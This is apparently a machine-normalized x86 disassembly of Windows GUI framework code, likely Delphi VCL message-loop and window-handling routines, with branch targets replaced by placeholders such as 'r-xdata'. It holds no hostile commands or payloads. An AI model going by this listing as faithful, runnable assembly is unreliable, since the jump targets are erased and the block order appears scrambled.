call sub_3ad0ba0
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_3acf348
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_3acf2ec
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_3ac4004
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax ebx
call sub_3ab7c38
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x13a ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ rw-data ]
call sub_3acd560
push ebp
call sub_3ace434
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
push ebp
call sub_3ace434
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0xa5 ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
sub eax 0x14
je r-xdata
push ebp
call sub_3ace434
pop ecx
jmp [ eax * 4 + jump_table_3ace560 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax ebx
call sub_3ab7c38
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3acf094
test al al
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x4 ]
call sub_3aceb7c
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3acdffc
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ad1240
and al [ rw-data ]
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_3ace434
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_3ac4004
test eax eax
je r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_3ace434
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_3a82e54
jmp r-xdata
xor eax eax
call sub_3ac432c
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov esi eax
mov eax ebx
call sub_3ab7c38
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_3ab0e78
push esi
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
jmp r-xdata
mov eax [ rw-data ]
call sub_3ad1240
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3aceb98
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call __imp_SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ace05c
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov [ rw-data ] 0x0
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
sub eax 0x4
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call sub_3acb504
jmp r-xdata
push ebp
call sub_3ace434
pop ecx
jmp r-xdata
push ebp
call sub_3ace470
pop ecx
jmp r-xdata
push ebp
call sub_3ace434
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xb4 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_3ab7c38
push eax
call IsWindowEnabled
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_3acec78
jmp r-xdata
jmp r-xdata
call sub_3abdd24
call sub_3abde88
jmp r-xdata
jmp r-xdata
call sub_3a6eae0
call sub_3a650f8
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3abd02c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3ace3c8
push ebp
call sub_3ace434
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ace004
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push ebp
call sub_3ace434
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ace05c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_3ab7c38
cmp eax [ rw-data ]
je r-xdata
push ebp
call sub_3ace434
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_3ac41cc
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb4 ] eax
call sub_3ac4290
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xb4 ] edx
mov eax [ rw-data ]
push eax
call SetFocus
sub_3aceb98
push ebx
mov ebx eax
mov eax [ ebx + 0x30 ]
call sub_3ac4004
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_3acdffc
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
mov [ rw-data ] 0x1
xor edx edx
mov eax ebx
call sub_3ace1b8
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_3acd7e0
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
mov eax [ ebx + 0x44 ]
call sub_3ab7c38
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax ebx
call sub_3ad1240
test al al
je r-xdata
push 0x40
push 0x0
mov eax [ ebx + 0x44 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_3ac6970
push eax
mov eax [ ebx + 0x44 ]
call sub_3ac6950
push eax
mov eax [ ebx + 0x44 ]
call sub_3ab7c38
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov dl 0x1
mov eax [ ebx + 0x44 ]
call sub_3ac8700
jmp r-xdata
cmp [ ebx + 0x142 ] 0x0
je r-xdata
sub_3acec78
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
call sub_3ac4004
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov [ rw-data ] 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
mov eax ebx
call sub_3ad1240
test al al
je r-xdata
mov eax ebx
call sub_3ace05c
mov dl 0x1
mov eax ebx
call sub_3ace1b8
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x273 ] 0x1
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push 0x9
mov eax [ ebx + 0x44 ]
call sub_3ab7c38
push eax
call ShowWindow
jmp r-xdata
cmp [ ebx + 0x14a ] 0x0
je r-xdata
mov eax esi
call sub_3ab7c38
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_3ab7c38
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
xor edx edx
call sub_3ac8700
mov eax [ ebx + 0x44 ]
call sub_3acb6ac
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_3acd7e0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
adc eax 0x0
sub_3aceda8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_3ad1240
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
cmp [ ebx + 0x44 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
mov eax [ ebx + 0x44 ]
call sub_3ab7c38
jmp r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
test eax eax
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_3acedfc
push ebx
push esi
add esp 0xfffffefc
mov esi edx
mov ebx eax
cmp [ ebx + 0xac ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_3a652f4
mov eax ebx
call sub_3ad1240
test al al
jne r-xdata
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_3a65390
mov eax [ esi ]
mov [ esp + 0x100 ] eax
mov eax [ esp + 0x100 ]
test eax eax
je r-xdata
test eax eax
jne r-xdata
sub eax 0x4
mov eax [ eax ]
add esp 0x104
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_3a652f4
jmp r-xdata
sub_3acee7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8c ]
mov edx esi
call sub_3a656c8
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xac ] 0x0
je r-xdata
lea eax [ ebx + 0x8c ]
mov edx esi
call sub_3a652f4
mov eax ebx
call sub_3ad1240
test al al
je r-xdata
mov eax esi
call sub_3a65730
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowTextA
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowTextA
jmp r-xdata
sub_3aceed4
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ ebx + 0xb8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
call IsWindowUnicode
test eax eax
je r-xdata
push esi
mov eax [ ebx + 0xb8 ]
push eax
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
push esi
mov eax [ ebx + 0xb8 ]
push eax
call IsDialogMessageW
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
sub_3acef1c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x277 ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x277 ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x29c ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_3acef6c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x109
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push esp
push ebp
call GetWindowThreadProcessId
lea eax [ esp + 0x4 ]
push eax
mov eax [ edi + 0x30 ]
push eax
call GetWindowThreadProcessId
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call __imp_SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_3aac63c
test al al
jne r-xdata
cmp ebp [ eax + 0x29c ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_3ab7c38
mov ebp eax
jmp r-xdata
push ebp
call IsWindowUnicode
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageW
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
jmp r-xdata
sub_3acf060
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xec ]
test al al
je r-xdata
mov eax ebp
call sub_3ad03d8
sub_3acf094
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x152 ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x154 ]
call [ ebx + 0x150 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_3ab7c38
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
movzx eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffa5
call sub_3a6457c
test al al
jne r-xdata
sub_3acf100
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax [ ebp ]
sub eax 0x11
je r-xdata
mov [ ebp + 0xc ] 0x1
sub eax 0xb038
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0xd0 ]
call sub_3a6641c
test eax eax
jl r-xdata
inc eax
xor ebx ebx
inc ebx
dec eax
jne r-xdata
mov edx [ esi + 0xd0 ]
cmp [ edx + edi * 4 + 0x4 ] 0x0
je r-xdata
lea edi [ ebx + ebx * 2 ]
mov edx [ esi + 0xd0 ]
mov edx [ edx + edi * 4 ]
cmp edx [ ebp + 0x4 ]
jne r-xdata
jmp r-xdata
mov eax [ esi + 0xd0 ]
cmp [ eax + edi * 4 + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0xd0 ]
mov eax [ eax + edi * 4 + 0x4 ]
call sub_3ab7c14
mov eax [ esi + 0xd0 ]
mov eax [ eax + edi * 4 + 0x4 ]
call sub_3ab472c
jmp r-xdata
mov eax [ esi + 0xd0 ]
mov eax [ eax + edi * 4 + 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_3acb750
jmp r-xdata
sub_3acf19c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x0
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ edi ]
test ebp ebp
je r-xdata
xor eax eax
jmp r-xdata
push ebp
call IsWindowUnicode
test eax eax
jne r-xdata
mov [ esp ] al
cmp [ esp ] 0x0
je r-xdata
mov al 0x1
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
cmp eax 0x1
sbb eax eax
inc eax
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageW
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
test al al
je r-xdata
mov [ esi + 0xa4 ] 0x1
mov [ esp + 0x1 ] 0x0
cmp [ esi + 0x102 ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_3ad0d04
test al al
jne r-xdata
lea ecx [ esp + 0x1 ]
mov edx edi
mov eax [ esi + 0x104 ]
call [ esi + 0x100 ]
mov edx edi
mov eax esi
call sub_3acf060
test al al
jne r-xdata
cmp [ esp + 0x1 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_3acef1c
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_3acef6c
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_3aceed4
test al al
jne r-xdata
push edi
call TranslateMessage
cmp [ esp ] 0x0
je r-xdata
push edi
call DispatchMessageA
jmp r-xdata
push edi
call DispatchMessageW
jmp r-xdata
sub_3acf2c8
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_3acf19c
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_3acfdd4
sub_3acf2ec
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xac ] 0x0
jne r-xdata
mov eax [ ebx + 0xb0 ]
call sub_3a7a474
mov eax 0x8
call sub_3a62ee0
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xb0 ]
call sub_3a7a33c
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call __imp_SendMessageA
jmp r-xdata
sub_3acf348
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xac ] 0x0
jne r-xdata
mov eax [ ebx + 0xb0 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call __imp_SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xb0 ]
call sub_3a7a494
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_3a62efc
mov edx esi
mov eax [ ebx + 0xb0 ]
call sub_3a7a388
jmp r-xdata
sub_3acf3dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax esi
call [ eax - 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_3acf503
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
push ebp
push sub_3acf457
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
or edx 0xffffffff
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
movzx edx [ eax + 0x54 ]
or dx 0x8000
mov [ eax + 0x54 ] dx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3acf50a
mov eax [ ebp - 0x8 ]
movzx edx [ eax + 0x54 ]
and dx 0x8000
cmp dx 0x8000
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
retn
movzx edx [ eax + 0x54 ]
and dx 0x7fff
mov [ eax + 0x54 ] dx
mov esi [ ebp - 0x8 ]
mov eax esi
call sub_3ab7c14
mov [ ebx + 0x44 ] esi
mov eax ebx
call sub_3ad1240
test al al
je r-xdata
mov eax ebx
call sub_3ad1240
xor al 0x1
push eax
mov eax ebx
call sub_3ad1240
mov edx eax
xor dl 0x1
mov eax [ ebx + 0x30 ]
pop ecx
call sub_3ac4080
push 0xffffffec
mov esi [ ebx + 0x30 ]
push esi
call GetWindowLongA
or eax 0x8000000
push eax
push 0xffffffec
push esi
call SetWindowLongA
sub_3acf514
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xad ] 0x1
xor edx edx
push ebp
push sub_3acf60f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_3ac4144
call sub_3a691b0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3acf616
mov eax [ ebp - 0x4 ]
mov [ eax + 0xad ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_3ac8700
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push sub_3acf5d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3acf2c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x273 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x273 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3aceb98
cmp [ rw-data ] 0x1
jne r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_3acb6ac
jmp r-xdata
mov dl 0x1
call sub_3ac6dc0
sub_3acf630
push ebx
push esi
add esp 0xfffffe00
mov esi edx
call sub_3a64258
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
setne al
add esp 0x200
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_3a64260
mov eax esp
push eax
lea edx [ esp + 0x104 ]
mov eax esi
call sub_3a64260
lea edx [ esp + 0x104 ]
pop eax
movzx ecx [ eax ]
inc ecx
call sub_3a639d4
jne r-xdata
mov eax ebx
call sub_3a6430c
mov ebx eax
sub_3acf68c
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_3a62f64
mov edx [ r-xdata ]
call sub_3acf630
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call __imp_SendMessageA
call sub_3a62f84
push eax
call sub_3a62f64
pop edx
call sub_3a6d22c
call sub_3a62f64
mov edx [ r-xdata ]
call sub_3acf630
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xea ] 0x0
je r-xdata
call sub_3a62f64
mov edx eax
mov eax ebx
call sub_3acf898
pop esi
pop ebx
retn
call sub_3a62f64
mov ecx eax
mov edx esi
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
jmp r-xdata
sub_3acf71c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3ad0b18
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
call sub_3ac41cc
mov [ ebp - 0x14 ] eax
call sub_3ac4024
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
call sub_3ace31c
test al al
je r-xdata
mov [ ebp - 0x48 ] 0x28
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x40 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
push 0x2
mov eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x1c ]
je r-xdata
xor ecx ecx
push ebp
push sub_3acf884
push [ fs : ecx ]
mov [ fs : ecx ] esp
push esi
mov eax [ ebp - 0x8 ]
push eax
push edi
push ebx
call MessageBoxA
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3acf88b
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x1c ]
je r-xdata
or esi 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x44 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x14 ]
call sub_3ac4290
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x20 ]
call sub_3ac402c
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x54 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x58 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_3acf898
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3acf953
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_3a65338
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_3acedfc
mov eax [ ebp - 0x108 ]
call sub_3a65730
push eax
mov eax [ ebp - 0x4 ]
call sub_3a65730
mov edx eax
mov eax ebx
pop ecx
